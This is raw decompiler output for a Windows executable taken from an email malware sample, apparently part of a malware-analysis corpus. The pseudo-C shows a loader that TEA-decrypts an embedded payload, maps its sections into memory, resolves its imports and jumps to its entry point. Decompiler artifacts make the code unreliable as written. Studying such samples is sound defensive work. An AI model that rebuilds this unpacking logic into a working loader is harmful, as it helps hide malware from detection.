/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_1331/ia32_pe/subject.exe'
 */

stack space not deallocated on return
/*	Procedure: 0x003E1000 - 0x003E1020
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 8
 */

L003E1000()
{
	/* unknown */ void  esp;
	/* unknown */ void  ebp;



    (restore)ebp;
    esp = esp - 8;
    *(ebp - 8) = *(ebp + 8);
    ecx = *(ebp - 8);
    *(ebp - 4) = *(ebp - 8) + *(ecx + 60);
    (save)ebp;
    return(*(ebp - 4));
}

stack space not deallocated on return
/*	Procedure: 0x003E1021 - 0x003E1053
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1021()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    L003E18F3( *(ebp + 12), *(ebp + 8), *(ebp + 16));
    return(*__imp__VirtualProtect( *(ebp + 12), *(ebp + 16), 2, ebp - 4));
}

/*	Procedure: 0x003E1054 - 0x003E105F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1054()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x003E1060 - 0x003E1072
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1060(A8)
/* unknown */ void  A8;
{



    eax = ~(A8 & -2147483648);
    asm("sbb eax,eax");
    return(~eax);
}

stack space not deallocated on return
/*	Procedure: 0x003E1073 - 0x003E1196
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1073()
{



    (save)ebp;
    ebp = esp;
    esp = esp - 36;
    *(ebp - 8) = *(ebp + 8) + 128;
    ecx = *(ebp - 8);
    for(*(ebp - 4) = *(ebp + 12) + *ecx; 1; *(ebp - 4) = *(ebp - 4) + 20) {
        eax = *(ebp - 4);
        if(*(eax + 12) == 0) {
            break;
        }
        *(ebp - 12) = 0;
        *(ebp - 16) = 0;
        ecx = *(ebp - 4);
        *(ebp - 28) = *(ebp + 12) + *(ecx + 12);
        *(ebp - 24) = *__imp__LoadLibraryA( *(ebp - 28));
        (save) *(ebp - 4);
        if(*(ecx + 4) != 0) {
            ecx = *(ebp - 4);
            *(ebp - 12) = *(ebp + 12) + *ecx;
        } else {
            edx = *(ebp - 4);
            *(ebp - 12) = *(ebp + 12) + *(edx + 16);
        }
        eax = *(ebp - 4);
        for(*(ebp - 20) = *(ebp + 12) + *(eax + 16); *( *(ebp - 12)) != 0; *(ebp - 12) = *(ebp - 12) + 4) {
            (save) *(ebp - 24);
            L003E1060( *( *(ebp - 12)));
            if((al & 255) == 0) {
                edx = *(ebp - 12);
                *(ebp - 36) = *(ebp + 12) + *edx;
                (save) *(ebp - 36) + 2;
                *(ebp - 16) = *__imp__GetProcAddress( *(ebp - 24));
            } else {
                *(ebp - 32) = *( *(ebp - 12)) & 65535;
                (save) *(ebp - 32) & 65535;
                (save) *(ebp - 24);
                *(ebp - 16) = *__imp__GetProcAddress();
            }
            (save) *(ebp - 16);
            *( *(ebp - 20)) = ecx;
            *(ebp - 20) = *(ebp - 20) + 4;
        }
    }
    esp = ebp;
    (restore)ebp;
}

/*	Procedure: 0x003E1197 - 0x003E119B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1197()
{



}

/*	Procedure: 0x003E119C - 0x003E119F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E119C()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

stack space not deallocated on return
/*	Procedure: 0x003E11A0 - 0x003E1206
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E11A0()
{



    (save)ebp;
    ebp = esp;
    esp = esp - 12;
    for(*(ebp - 12) = 0; *(ebp - 12) < *(ebp + 16); *(ebp - 12) = eax) {
        eax = *(ebp - 12);
        *__imp__WriteFile( *( *(ebp + 8) + 4));
        *__imp__ReadFile( *( *(ebp + 8)), ecx + *(ebp - 12) * 4, *(ebp + 12), 8, ebp - 8, 0, *(ebp + 12) + eax * 4, 8, ebp - 4, 0);
        eax = *(ebp - 12) + 2;
    }
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x003E1207 - 0x003E12FF
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 8
 */

L003E1207()
{
	/* unknown */ void  esp;
	/* unknown */ void  ebp;



    (restore)ebp;
    esp = esp - 40;
    for(*(ebp - 12) = *(ebp + 8); 1; *__imp__WriteFile( *( *(ebp - 12) + 4), ebp - 8, 8, ebp - 16, 0)) {
        (save)0;
        (save)ebp - 20;
        (save)8;
        (save)ebp - 8;
        if(*__imp__ReadFile( *( *(ebp - 12))) == 0) {
            break;
        }
        *(ebp - 28) = 32;
        *(ebp - 24) = *(ebp - 8);
        *(ebp - 32) = *(ebp - 4);
        *(ebp - 40) = -1640531527;
        for(*(ebp - 36) = *(ebp - 40) << 5; 1; *(ebp - 36) = *(ebp - 36) - *(ebp - 40)) {
            edx = *(ebp - 28);
            *(ebp - 28) = *(ebp - 28) - 1;
            if(edx <= 0) {
                break;
            }
            (save) *(ebp - 24);
            ecx = (ecx << 4) + *L004199BA;
            ecx = ecx ^ *(ebp - 24) + *(ebp - 36);
            ecx = ecx ^ ( *(ebp - 24) >> 5) + *L004199BE;
            *(ebp - 32) = *(ebp - 32) - ecx;
            eax = ( *(ebp - 32) << 4) + *L004199B2;
            eax = eax ^ *(ebp - 32) + *(ebp - 36);
            eax = eax ^ ( *(ebp - 32) >> 5) + *L004199B6;
            *(ebp - 24) = *(ebp - 24) - eax;
        }
        *(ebp - 8) = *(ebp - 24);
        *(ebp - 4) = *(ebp - 32);
    }
    (save)ebp;
    return(0);
}

stack space not deallocated on return
/*	Procedure: 0x003E1300 - 0x003E131F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1300()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save) *( *(ebp + 8));
    *__imp__CloseHandle();
    return(*__imp__CloseHandle( *( *(ebp + 8) + 4)));
}

stack space not deallocated on return
/*	Procedure: 0x003E1320 - 0x003E14D2
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1320()
{



    ebp = esp;
    esp = esp - 48;
    *(ebp - 4) = L003E14F0(ebp);
    (save) *( *(ebp - 4) + 48);
    *(ebp - 24) = ecx;
    if(( *( *(ebp - 24) + 2) & 255) != 0) {
        eax = 0;
    } else {
        *L004199B2 = 4824;
        *L004199B2 = *L004199B2 + 19436;
        *L004199B6 = 8696;
        *L004199B6 = *L004199B6 + 11017;
        *L004199BA = 21231;
        *L004199BE = 1574;
        *L004199BE = *L004199BE + 6138;
        (save)16;
        (save)0;
        (save)ebp - 16;
        (save)ebp - 32;
        if(*__imp__CreatePipe() == 0) {
            eax = 0;
        } else {
            (save)16;
            (save)0;
            (save)ebp - 28;
            (save)ebp - 20;
            if(*__imp__CreatePipe() == 0) {
                eax = 0;
            } else {
                (save)ebp - 8;
                (save)0;
                (save)ebp - 32;
                (save)0x3e1207;
                (save)0;
                (save)0;
                *(ebp - 36) = *__imp__CreateThread();
                L003E11A0(ebp - 20, 0x3e3000, *L003ED40B >> 2);
                L003E1300(ebp - 20);
                L003E1300(ebp - 32);
                (save) *(ebp - 36);
                *__imp__CloseHandle();
                *(ebp - 12) = L003E1000(0x3e3000);
                if(*(ebp - 12) != 0) {
                    *(ebp - 44) = *( *(ebp - 12) + 52);
                    L003E1021(0x3e3000, *(ebp - 44), *( *(ebp - 12) + 84));
                    L003E1500( *(ebp - 12), 0x3e3000, *(ebp - 44));
                    *(ebp - 40) = L003E1000( *(ebp - 44));
                    if(*(ebp - 40) != 0) {
                        L003E1073( *(ebp - 40), *(ebp - 44));
                        L003E16A9( *(ebp - 40), *(ebp - 44));
                        eax = *(ebp - 24);
                        *(eax + 8) = *(ebp - 44);
                        edx = *(ebp - 12);
                        *(ebp - 48) = *(ebp - 44) + *(edx + 40);
                        *(ebp - 48)();
                    }
                }
                L003E1197();
                eax = 0;
            }
        }
    }
    esp = ebp;
    (restore)ebp;
}

/*	Procedure: 0x003E14D3 - 0x003E14ED
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    (save)ecx;
    *(ebp - 4) = L003E1320();
    eax = *__imp__ExitProcess( *(ebp - 4));
    esp = ebp;
}

/*	Procedure: 0x003E14EE - 0x003E14EF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E14EE()
{



    asm("int3");
    asm("int3");
}

/*	Procedure: 0x003E14F0 - 0x003E14FA
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E14F0()
{



    return(*%fs:0x18]);
}

/*	Procedure: 0x003E14FB - 0x003E14FF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E14FB()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x003E1500 - 0x003E15D0
 *	Argument size: -28
 *	Local size: 40
 *	Save regs size: 0
 */

L003E1500(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffff4 = A8 + 248;
    Vfffffff8 = *(A8 + 6);
    Vfffffffc = Vfffffff4;
    for(Vfffffff0 = 0; 1; Vfffffff0 = Vfffffff0 + 1) {
        eax = Vfffffff8 & 65535;
        if((Vfffffff0 & 65535) >= eax) {
            break;
        }
        ecx = Vfffffff0 & 65535;
        40 = ecx * ecx;
        Vffffffdc = *(ecx + Vfffffffc + 8);
        ecx = Vfffffff0 & 65535;
        40 = ecx * ecx;
        Vffffffec = *(ecx + Vfffffffc + 16);
        Vffffffd8 = Vffffffdc >= Vffffffec ? Vffffffec : Vffffffdc;
        Vffffffe8 = Vffffffd8;
        edx = Vfffffff0 & 65535;
        40 = edx * edx;
        Vffffffe4 = A10 + *(edx + Vfffffffc + 12);
        edx = Vfffffff0 & 65535;
        40 = edx * edx;
        Vffffffe0 = Ac + *(edx + Vfffffffc + 20);
        L003E18F3(Vffffffe4, Vffffffe0, Vffffffe8);
    }
}

stack space not deallocated on return
/*	Procedure: 0x003E15D1 - 0x003E16A8
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 8
 */

L003E15D1()
{
	/* unknown */ void  esp;
	/* unknown */ void  ebp;



    (restore)ebp;
    (save)ecx;
    *(ebp - 4) = 0;
    if(!(eax = *(ebp + 8) & 67108864)) {
        *(ebp - 4) = *(ebp - 4) | 512;
    }
    *(ebp - 4) = !(edx = *(ebp + 8) & 536870912) ? !(eax = *(ebp + 8) & 1073741824) ? !(ecx = *(ebp + 8) & -2147483648) ? *(ebp - 4) | 64 : *(ebp - 4) | 32 : !(ecx = *(ebp + 8) & -2147483648) ? *(ebp - 4) | 128 : *(ebp - 4) | 16 : !(ecx = *(ebp + 8) & 1073741824) ? !(edx = *(ebp + 8) & -2147483648) ? *(ebp - 4) | 4 : *(ebp - 4) | 2 : !(edx = *(ebp + 8) & -2147483648) ? *(ebp - 4) | 8 : *(ebp - 4) | 1;
    (save)ebp;
    return(*(ebp - 4));
}

/*	Procedure: 0x003E16A9 - 0x003E1743
 *	Argument size: -20
 *	Local size: 28
 *	Save regs size: 0
 */

L003E16A9(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffff4 = A8 + 248;
    Vfffffff8 = *(A8 + 6);
    Vfffffffc = Vfffffff4;
    for(Vfffffff0 = 0; 1; Vfffffff0 = Vfffffff0 + 1) {
        eax = Vfffffff8 & 65535;
        if((Vfffffff0 & 65535) >= eax) {
            break;
        }
        ecx = Vfffffff0 & 65535;
        40 = ecx * ecx;
        Vffffffe8 = Ac + *(ecx + Vfffffffc + 12);
        ecx = Vfffffff0 & 65535;
        40 = ecx * ecx;
        Vffffffe4 = *(ecx + Vfffffffc + 8);
        edx = Vfffffff0 & 65535;
        40 = edx * edx;
        *__imp__VirtualProtect(Vffffffe8, Vffffffe4, L003E15D1( *(edx + Vfffffffc + 36)), & Vffffffec);
    }
}

/*	Procedure: 0x003E1744 - 0x003E174F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1744()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x003E1750 - 0x003E176D
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1750(A8)
/* unknown */ void  A8;
{



    if(A8 >= 65) {
        if(A8 > 90) {
            goto L003e1768;
        }
        A8 = A8 + 32;
    } else {
L003e1768:
    }
}

/*	Procedure: 0x003E176E - 0x003E178A
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E176E(A8)
/* unknown */ void  A8;
{



    if(A8 >= 97) {
        if(A8 > 122) {
            goto L003e1785;
        }
        A8 = A8 - 32;
    } else {
L003e1785:
    }
}

/*	Procedure: 0x003E178B - 0x003E1794
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E178B()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    (restore)ebp;
}

/*	Procedure: 0x003E1795 - 0x003E1799
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1795()
{



}

/*	Procedure: 0x003E179A - 0x003E179F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E179A()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x003E17A0 - 0x003E17BE
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E17A0(A8)
/* unknown */ void  A8;
{



    *(ebp - 4) = *__imp__HeapAlloc( *__imp__GetProcessHeap(), 0, A8, ecx);
    return(*(ebp - 4));
}

/*	Procedure: 0x003E17BF - 0x003E17D2
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E17BF()
{
	/* unknown */ void  ebp;



    ebp = esp;
    eax = *(ebp + 8);
    *(ebp + 12) = *(ebp + 12) * eax;
    return(L003E17A0(eax));
}

/*	Procedure: 0x003E17D3 - 0x003E17FD
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E17D3()
{
	/* unknown */ void  ebp;



    ebp = esp;
    eax = *(ebp + 8) == 0 ? L003E17A0( *(ebp + 12)) : *__imp__HeapReAlloc( *__imp__GetProcessHeap(), 0, *(ebp + 8), *(ebp + 12));
}

/*	Procedure: 0x003E17FE - 0x003E181C
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E17FE(A8)
/* unknown */ void  A8;
{



    if(A8 == 0) {
    } else {
        eax = *__imp__HeapFree( *__imp__GetProcessHeap(), 0, A8);
    }
}

/*	Procedure: 0x003E181D - 0x003E182A
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E181D()
{
	/* unknown */ void  ebp;



    return(L003E17A0( *(esp + 8)));
}

/*	Procedure: 0x003E182B - 0x003E1838
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E182B()
{
	/* unknown */ void  ebp;



    return(L003E17FE( *(esp + 8)));
}

/*	Procedure: 0x003E1839 - 0x003E1844
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1839()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x003E1845 - 0x003E1854
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1845()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    *(ebp - 4) = *(ebp + 8);
    *(ebp - 3) = 0;
    esp = ebp;
}

/*	Procedure: 0x003E1855 - 0x003E1859
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1855()
{



}

stack space not deallocated on return
/*	Procedure: 0x003E185A - 0x003E1872
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E185A()
{
	/* unknown */ void  ebp;



    ebp = esp;
    esp = esp - 32;
    eax = L003E1B18( *(ebp + 8), ebp - 32, 10);
    esp = ebp;
}

/*	Procedure: 0x003E1873 - 0x003E188B
 *	Argument size: -28
 *	Local size: 32
 *	Save regs size: 0
 */

L003E1873(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vffffffe0;



    return(L003E1A40(A8, & Vffffffe0, 10));
}

stack space not deallocated on return
/*	Procedure: 0x003E188C - 0x003E18F2
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E188C()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    (save)ecx;
    for(*(ebp - 4) = *(ebp + 8); *(ebp + 16) != 0; *(ebp + 16) = *(ebp + 16) - 1) {
        eax = *(ebp + 8);
        *eax = *( *(ebp + 12));
        eax = *( *(ebp + 8));
        *(ebp + 8) = *(ebp + 8) + 1;
        *(ebp + 12) = *(ebp + 12) + 1;
        if(eax == 0) {
            break;
        }
    }
    if(*(ebp + 16) != 0) {
        while(!( *(ebp + 16) = *(ebp + 16) - 1)) {
            *( *(ebp + 8)) = 0;
            *(ebp + 8) = *(ebp + 8) + 1;
        }
    }
    eax = *(ebp - 4);
    esp = ebp;
    (restore)ebp;
}

/*	Procedure: 0x003E18F3 - 0x003E192E
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L003E18F3(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    (save)ecx;
    for(*(ebp - 4) = A8; 1; Ac = Ac + 1) {
        A10 = A10 - 1;
        if(A10 == 0) {
            break;
        }
        *A8 = *Ac;
        A8 = A8 + 1;
    }
    return(*(ebp - 4));
}

stack space not deallocated on return
/*	Procedure: 0x003E192F - 0x003E195E
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E192F()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    for(*(ebp - 4) = *(ebp + 8); 1; *(ebp + 8) = *(ebp + 8) + 1) {
        eax = *(ebp + 16);
        *(ebp + 16) = *(ebp + 16) - 1;
        if(eax == 0) {
            break;
        }
        eax = *(ebp + 8);
        *eax = *(ebp + 12);
    }
    eax = *(ebp - 4);
    esp = ebp;
}

/*	Procedure: 0x003E195F - 0x003E19B8
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L003E195F(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    (save)ecx;
    for(*(ebp - 4) = 0; !( *(ebp - 4) = ( *A8 & 255) - ( *Ac & 255)) && *Ac != 0; Ac = Ac + 1) {
        A8 = A8 + 1;
    }
    if(*(ebp - 4) < 0) {
        *(ebp - 4) = *(ebp - 4) | -1;
    } else {
        if(*(ebp - 4) > 0) {
            *(ebp - 4) = 0;
            *(ebp - 4) = *(ebp - 4) + 1;
        }
    }
    return(*(ebp - 4));
}

/*	Procedure: 0x003E19B9 - 0x003E19E0
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E19B9(A8)
/* unknown */ void  A8;
{



    (save)ecx;
    *(ebp - 4) = A8;
    while(1) {
        eax = *( *(ebp - 4));
        *(ebp - 4) = *(ebp - 4) + 1;
        if(eax == 0) {
            break;
        }
    }
    return(*(ebp - 4) - A8 - 1);
}

/*	Procedure: 0x003E19E1 - 0x003E1A37
 *	Argument size: -8
 *	Local size: 16
 *	Save regs size: 0
 */

L003E19E1(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    do {
        Vfffffff4 = *A8 & 255;
        Vfffffffc = L003E1750(Vfffffff4);
        A8 = A8 + 1;
        Vfffffff0 = *Ac & 255;
        Vfffffff8 = L003E1750(Vfffffff0);
        Ac = Ac + 1;
    } while(Vfffffffc != 0 && Vfffffffc == Vfffffff8);
    return(Vfffffffc - Vfffffff8);
}

/*	Procedure: 0x003E1A38 - 0x003E1A3F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1A38()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x003E1A40 - 0x003E1A5A
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1A40(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    L003E1A5B(A8, Ac, A10, 0);
    return(Ac);
}

stack space not deallocated on return
/*	Procedure: 0x003E1A5B - 0x003E1B17
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1A5B()
{
	/* unknown */ void  ebp;



    ebp = esp;
    esp = esp - 16;
    *(ebp - 4) = *(ebp + 12);
    if(*(ebp + 20) != 0) {
        *( *(ebp - 4)) = 45;
        *(ebp - 4) = *(ebp - 4) + 1;
        *(ebp + 8) = ~( *(ebp + 8));
    }
    *(ebp - 16) = *(ebp - 4);
    do {
        eax = *(ebp + 8);
        edx = 0;
        *(ebp + 16) = *(ebp + 16) / *(ebp + 16);
        *(ebp - 8) = *(ebp + 16) % *(ebp + 16);
        eax = *(ebp + 8);
        edx = 0;
        *(ebp + 16) = *(ebp + 16) / *(ebp + 16);
        edx = *(ebp + 16) % *(ebp + 16);
        *(ebp + 8) = eax;
        if(*(ebp - 8) <= 9) {
            eax = *(ebp - 8) + 48;
            *( *(ebp - 4)) = al;
            *(ebp - 4) = *(ebp - 4) + 1;
        } else {
            eax = *(ebp - 8) + 87;
            *( *(ebp - 4)) = al;
            *(ebp - 4) = *(ebp - 4) + 1;
        }
    } while(*(ebp + 8) > 0);
    *( *(ebp - 4)) = 0;
    *(ebp - 4) = *(ebp - 4) - 1;
    do {
        *(ebp - 9) = *( *(ebp - 4));
        eax = *(ebp - 4);
        *eax = *( *(ebp - 16));
        eax = *(ebp - 16);
        *eax = *(ebp - 9);
        *(ebp - 4) = *(ebp - 4) - 1;
        *(ebp - 16) = *(ebp - 16) + 1;
        eax = *(ebp - 16);
    } while(eax < *(ebp - 4));
    esp = ebp;
}

/*	Procedure: 0x003E1B18 - 0x003E1B53
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1B18()
{
	/* unknown */ void  ebp;



    ebp = esp;
    if(*(ebp + 16) == 10) {
        if(*(ebp + 8) >= 0) {
            goto L003e1b3c;
        }
        L003E1A5B( *(ebp + 8), *(ebp + 12), *(ebp + 16), 1);
    } else {
L003e1b3c:
        L003E1A5B( *(ebp + 8), *(ebp + 12), *(ebp + 16), 0);
    }
    return(*(ebp + 12));
}

/*	Procedure: 0x003E1B54 - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1B54()
{



}

/* address  size  */
/* 0x003e14d3       0 */ /* unknown */ void 	__entry_point__;
/* 0x003e2000       0 */ /* unknown */ void 	__imp__VirtualProtect;
/* 0x003e2004       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x003e2008       0 */ /* unknown */ void 	__imp__LoadLibraryA;
/* 0x003e200c       0 */ /* unknown */ void 	__imp__ReadFile;
/* 0x003e2010       0 */ /* unknown */ void 	__imp__WriteFile;
/* 0x003e2014       0 */ /* unknown */ void 	__imp__CloseHandle;
/* 0x003e2018       0 */ /* unknown */ void 	__imp__CreateThread;
/* 0x003e201c       0 */ /* unknown */ void 	__imp__CreatePipe;
/* 0x003e2020       0 */ /* unknown */ void 	__imp__ExitProcess;
/* 0x003e2024       0 */ /* unknown */ void 	__imp__HeapAlloc;
/* 0x003e2028       0 */ /* unknown */ void 	__imp__GetProcessHeap;
/* 0x003e202c       0 */ /* unknown */ void 	__imp__HeapReAlloc;
/* 0x003e2030       0 */ /* unknown */ void 	__imp__HeapFree;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
